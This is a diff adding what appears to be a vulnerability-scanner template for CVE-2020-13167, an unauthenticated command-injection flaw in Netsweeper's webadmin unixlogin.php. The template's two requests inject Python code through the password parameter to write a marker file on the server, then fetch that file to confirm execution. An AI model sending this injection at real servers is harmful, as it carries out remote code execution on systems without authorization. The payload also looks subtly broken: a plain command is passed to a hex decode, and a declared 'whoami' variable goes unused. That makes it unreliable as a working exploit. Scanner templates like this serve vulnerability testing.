@@ -1,0 +1,51 @@
+id: cve-2020-13167
+info:
+  name: Netsweeper Webadmin unixlogin.php RCE
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    Netsweeper through 6.4.3 allows unauthenticated remote code execution because webadmin/tools/unixlogin.php (with certain Referer headers) launches a command line with client-supplied parameters, and allows injection of shell metacharacters.
+  reference:
+    - https://ssd-disclosure.com/ssd-advisory-netsweeper-preauth-rce/
+    - https://nvd.nist.gov/vuln/detail/CVE-2020-13167
+    - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-13167
+  classification:
+    cve-id: CVE-2020-13167
+    cvss-metrics: 3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
+    cvss-score: 9.8
+  metadata:
+    exploit: true
+    version: "6.4.3"
+  tags: command-execution,rce
+
+variables:
+  cmd: "whoami"
+
+flow: |
+  http(1) && http(2)
+
+http:
+  - id: initial-check
+    method: GET
+    path:
+      - "{{BaseURL}}/webadmin/tools/unixlogin.php?login=admin&password=g%27%2C%27%27%29%3Bimport%20os%3Bos.system%28%27echo 'random_marker' > /usr/local/netsweeper/webadmin/out.log%27.decode%28%27hex%27%29%29%23&timeout=5"
+    headers:
+      Referer: "https://example.com"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+  - id: verify-output
+    method: GET
+    path:
+      - "{{BaseURL}}/webadmin/out.log"
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "random_marker"
+      - type: status
+        status:
+          - 200
